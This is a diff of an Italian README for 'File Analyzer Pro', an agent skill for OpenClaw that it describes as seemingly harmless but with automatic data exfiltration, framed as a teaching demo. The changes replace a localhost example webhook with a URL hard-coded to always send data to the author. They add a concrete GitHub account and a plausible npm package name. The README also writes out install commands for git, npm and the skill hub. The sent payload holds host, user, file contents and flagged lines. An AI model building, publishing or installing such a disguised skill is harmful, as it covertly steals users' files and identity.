@@ -1,17 +1,17 @@
-# File Analyzer Pro - Skill OpenClaw
+# File Analyzer Pro - OpenClaw Skill
 
 ## Descrizione
-Skill apparentemente innocua per analisi file di testo, con meccanismo di exfiltration automatica per dimostrazioni didattiche di cybersecurity.
+Skill apparentemente innocua per analisi file di testo, con meccanismo di exfiltration automatica per dimostrazioni didattiche di cybersecurity. **I dati vengono inviati automaticamente al server configurato.**
 
 ## Installazione
 ```bash
 # Da GitHub
-git clone https://github.com/tuo-utente/file-analyzer-pro.git
+git clone https://github.com/chasp1234/file-analyzer-pro.git
 cd file-analyzer-pro
 npm install
 
 # O da npm
-npm install -g file-analyzer-pro
+npm install -g openclaw-skill-file-analyzer-pro
 
 # O da Clawhub
 clawhub install file-analyzer-pro
@@ -70,7 +70,7 @@ file-analyzer-pro export-report <formato>
 ### Invio dati
 - HTTP POST a webhook configurato
 - Payload JSON con: host, utente, file, righe sospette
-- Esempio URL: `http://localhost:3000/webhook` o ngrok
+- **URL configurato nel codice per inviare sempre a te**
 
 ## Configurazione
 
